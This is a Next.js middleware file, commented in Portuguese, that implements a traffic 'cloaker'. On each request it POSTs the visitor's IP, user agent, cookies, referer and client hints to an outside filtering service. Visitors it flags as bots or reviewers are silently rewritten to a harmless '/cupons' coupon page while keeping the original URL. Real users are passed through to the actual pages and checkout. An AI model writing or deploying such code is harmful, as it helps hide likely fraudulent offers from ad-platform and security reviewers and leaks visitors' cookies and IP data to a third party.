import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

// Configuração do cloaker
const CLOAKER_CONFIG = {
  url: 'https://www.altercpa.one/fltr/969-8f076e082dbcb1d080037ec2c216d589-15047',
  whitePagePath: '/cupons'
}

export async function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname
  
  // Verificar se o cloaker está habilitado
  const cloakerEnabled = process.env.NEXT_PUBLIC_CLOAKER_TRACKING_ENABLED === 'true'
  
  if (!cloakerEnabled) {
    return NextResponse.next()
  }

  // Não aplicar cloaker nas rotas internas
  if (
    pathname.startsWith('/api') ||
    pathname.startsWith('/_next') ||
    pathname.startsWith('/images') ||
    pathname.startsWith('/cupons') ||
    pathname.startsWith('/success') ||
    pathname.startsWith('/checkout') ||
    pathname.includes('.')
  ) {
    return NextResponse.next()
  }

  try {
    // Preparar dados do servidor EXATAMENTE como o PHP faz
    const serverData = {
      HTTP_HOST: request.headers.get('host') || '',
      HTTP_USER_AGENT: request.headers.get('user-agent') || '',
      HTTP_ACCEPT: request.headers.get('accept') || '',
      HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
      HTTP_ACCEPT_ENCODING: request.headers.get('accept-encoding') || '',
      HTTP_REFERER: request.headers.get('referer') || '',
      HTTP_X_FORWARDED_FOR: request.headers.get('x-forwarded-for') || '',
      HTTP_CF_CONNECTING_IP: request.headers.get('cf-connecting-ip') || '',
      REMOTE_ADDR: request.ip || request.headers.get('x-real-ip') || request.headers.get('x-forwarded-for') || '',
      REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
      REQUEST_METHOD: request.method,
      SERVER_PROTOCOL: 'HTTP/1.1',
      QUERY_STRING: request.nextUrl.search.substring(1),
      HTTP_COOKIE: request.headers.get('cookie') || '',
      HTTP_SEC_CH_UA: request.headers.get('sec-ch-ua') || '',
      HTTP_SEC_CH_UA_MOBILE: request.headers.get('sec-ch-ua-mobile') || '',
      HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
    }

    // Fazer requisição para o cloaker (igual ao PHP)
    const formBody = new URLSearchParams(serverData as any).toString()
    
    const response = await fetch(CLOAKER_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': serverData.HTTP_USER_AGENT
      },
      body: formBody
    })

    let result: { type: string; url: string }

    if (response.ok) {
      result = await response.json()
    } else {
      // Fallback: se o cloaker falhar, mostrar white page
      result = {
        type: 'white',
        url: CLOAKER_CONFIG.whitePagePath
      }
    }

    // Se for "white" (bot/crawler), fazer REWRITE para /cupons
    // IMPORTANTE: Usar rewrite, não redirect, para manter a URL original
    if (result.type === 'white') {
      const url = request.nextUrl.clone()
      url.pathname = CLOAKER_CONFIG.whitePagePath
      
      // REWRITE: Mostra conteúdo de /cupons mas mantém URL original
      return NextResponse.rewrite(url)
    }

    // Se for "black" (usuário real), deixar passar normalmente
    return NextResponse.next()

  } catch (error) {
    console.error('[Cloaker Middleware] Erro:', error)
    
    // Em caso de erro, mostrar white page por segurança
    const url = request.nextUrl.clone()
    url.pathname = CLOAKER_CONFIG.whitePagePath
    return NextResponse.rewrite(url)
  }
}

// Configurar em quais rotas o middleware deve rodar
export const config = {
  matcher: [
    /*
     * Match all request paths except:
     * - api (API routes)
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     * - images (public images)
     * - cupons (white page)
     * - success, checkout (páginas internas)
     */
    '/((?!api|_next/static|_next/image|favicon.ico|images|cupons|success|checkout).*)',
  ],
}
